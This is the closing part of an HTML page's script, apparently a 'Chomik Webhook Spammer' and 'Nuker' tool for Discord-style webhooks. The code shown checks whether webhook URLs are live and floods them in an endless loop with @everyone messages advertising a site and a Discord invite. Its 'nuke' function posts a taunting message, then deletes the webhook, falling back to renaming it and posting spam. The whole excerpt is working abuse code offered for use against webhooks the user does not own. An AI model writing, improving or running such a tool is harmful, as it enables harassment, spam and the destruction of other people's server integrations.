         const webhookId = `webhook-${index}-${btoa(webhook).replace(/[^a-zA-Z0-9]/g, '')}`;
         checkWebhook(webhook, webhookId); // Pass ID to check function
      });
    }

    const spamControls = new Map(); // Keep original map

    async function startInfiniteSpam(webhook, button) {
        // Keep original logic, ensure querySelectors are correct
        const container = button.closest('.webhook-controls');
        if (!container) return;
        const spamInput = container.querySelector('.webhook-spam-input');
        const stopBtn = container.querySelector('.stop-btn');
        const spamBtn = container.querySelector('.spam-btn'); // Get spam button

        if (!spamInput || !stopBtn || !spamBtn) return;

        spamBtn.style.display = 'none'; // Hide spam button
        stopBtn.style.display = 'inline-block'; // Show stop button

        spamControls.set(webhook, true); // Mark as running

        while (spamControls.get(webhook)) { // Check flag in loop
            try {
                const content = spamInput.value || 'www.chomik.site @everyone';
                await fetch(webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: content,
                        username: 'Chomik Webhook Spammer',
                        avatar_url: 'https://imagedelivery.net/HL_Fwm__tlvUGLZF2p74xw/b5242d9e-b8db-4957-d35d-76442ed70c00/public',
                        allowed_mentions: { parse: ['everyone', 'here'] } // Allow both
                    })
                });
                // Add a small, slightly variable delay
                await new Promise(r => setTimeout(r, 50 + Math.random() * 100));
            } catch (error) {
                console.error('Spam error:', error);
                // Optional: Stop spamming on error or add retry logic
                // stopSpam(webhook, stopBtn); // Example: stop on error
                await new Promise(r => setTimeout(r, 1000)); // Wait longer on error
            }
        }
    }


    function stopSpam(webhook, stopBtn) {
        // Keep original logic, ensure querySelectors are correct
        spamControls.set(webhook, false); // Set flag to false to stop loop
        spamControls.delete(webhook); // Clean up map entry

        const container = stopBtn.closest('.webhook-controls');
         if (!container) return;
        const spamBtn = container.querySelector('.spam-btn');
        const currentStopBtn = container.querySelector('.stop-btn'); // Ensure we target the correct stop button

        if (spamBtn) spamBtn.style.display = 'inline-block'; // Show spam button
        if (currentStopBtn) currentStopBtn.style.display = 'none'; // Hide stop button
    }

    async function checkWebhook(webhook, webhookId) { // Accept webhookId
        // Keep original logic, ensure querySelector uses the passed ID
        const container = document.querySelector(`[data-webhook-id="${webhookId}"]`);
        if (!container) return;

        const statusElement = container.querySelector('.webhook-status');
        if (!statusElement) return;

        try {
            // Use HEAD request for efficiency, fallback to GET if needed
            let response = await fetch(webhook, { method: 'HEAD' });
            if (!response.ok) {
                 response = await fetch(webhook); // Fallback to GET
            }

            statusElement.textContent = response.ok ? '🟢 Working' : '🔴 Invalid';
            statusElement.style.color = response.ok ? '#00ff00' : '#ff0000';
        } catch (error) {
            if (DEBUG_MODE) console.warn(`Webhook check failed for ${webhookId}:`, error);
            statusElement.textContent = '❓ Error Checking';
            statusElement.style.color = '#ffa500'; // Orange for error
        }
    }


    async function nukeWebhook(webhook) {
        // Keep original logic, ensure querySelectors are correct
        const webhookId = `webhook-${btoa(webhook).replace(/[^a-zA-Z0-9]/g, '')}`; // Reconstruct ID if not passed
        const container = document.querySelector(`[data-webhook-id^="webhook-"][data-webhook-id$="${btoa(webhook).replace(/[^a-zA-Z0-9]/g, '')}"]`); // More flexible selector
        if (!container) {
             console.error("Nuke target container not found for ID ending with:", btoa(webhook).replace(/[^a-zA-Z0-9]/g, ''));
             return;
        }


        const statusElement = container.querySelector('.webhook-status');
        const controls = container.querySelector('.webhook-controls');
        if (!statusElement || !controls) return;


        statusElement.textContent = '⚠️ Nuking...';
        statusElement.style.color = '#ffa500';
        controls.style.opacity = '0.5';
        controls.style.pointerEvents = 'none';


        try {
            // Send nuke message
            await fetch(webhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: '**YOUR WEBHOOK HAS BEEN NUKED BY www.chomik.site** @everyone\nJoin us: https://discord.gg/wXPr48bDEJ',
                    username: 'Chomik Webhook Nuker',
                    avatar_url: 'https://imagedelivery.net/HL_Fwm__tlvUGLZF2p74xw/b5242d9e-b8db-4957-d35d-76442ed70c00/public',
                    allowed_mentions: { parse: ['everyone'] }
                })
            });
            await new Promise(r => setTimeout(r, 500)); // Shorter wait


            // Attempt DELETE
            const deleteResponse = await fetch(webhook, { method: 'DELETE' });


            // Check if delete was successful (204 No Content)
            if (deleteResponse.status === 204) {
                 statusElement.textContent = '💀 Nuked (Deleted)';
                 statusElement.style.color = '#ff0000';
            } else {
                 // If delete failed, try other methods (spam/patch) - less reliable
                 if (DEBUG_MODE) console.log(`Webhook delete failed with status ${deleteResponse.status}. Trying fallback methods.`);
                 // Fallback spam (less aggressive)
                 await fetch(webhook, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ content: ''.padStart(1000, 'NUKED ') })
                 });
                 await fetch(webhook, {
                     method: 'PATCH',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ name: 'NUKED_BY_CHOMIK' })
                 });
                 statusElement.textContent = '⚠️ Nuke Attempted (Delete Failed)';
                 statusElement.style.color = '#ffa500';
            }


        } catch (error) {
            statusElement.textContent = '❌ Nuke Failed';
            statusElement.style.color = '#ff0000';
            console.error('Nuke error:', error);
            controls.style.pointerEvents = 'auto';
            controls.style.opacity = '1';
        }
    }


    function insertMention(select) {
        // Keep original logic, ensure querySelectors are correct
        if (!select.value) return;
        const container = select.closest('.webhook-controls');
         if (!container) return;
        const input = container.querySelector('.webhook-spam-input');
         if (!input) return;
        // Append mention to existing text or set if empty
        input.value = input.value ? `${input.value} ${select.value}` : select.value;
        select.value = ''; // Reset select
        input.focus(); // Focus input after insertion
    }


  </script>
</body>
</html>
